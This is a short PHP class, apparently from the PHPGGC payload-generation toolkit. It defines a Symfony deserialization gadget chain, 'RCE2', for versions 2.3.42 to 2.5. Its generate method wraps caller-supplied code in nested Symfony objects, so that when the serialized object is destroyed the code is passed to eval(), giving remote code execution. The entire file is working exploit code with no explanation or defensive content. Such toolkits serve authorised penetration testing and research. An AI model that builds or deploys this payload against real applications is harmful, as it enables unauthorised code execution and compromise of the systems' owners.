<?php

namespace GadgetChain\Symfony;

class RCE2 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '2.3.42 < 2.5';
    public $vector = '__destruct';
    public $author = 'crlf';
    public $informations = 'Executes through eval() ( <?php \'.$code.\';die(); ?> )';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \Symfony\Component\Process\ProcessPipes(
               new \Symfony\Component\Finder\Expression\Expression(
               new \Symfony\Component\Templating\PhpEngine(
               new \Symfony\Component\Templating\Storage\StringStorage(
               $code
               ))));
    }
}
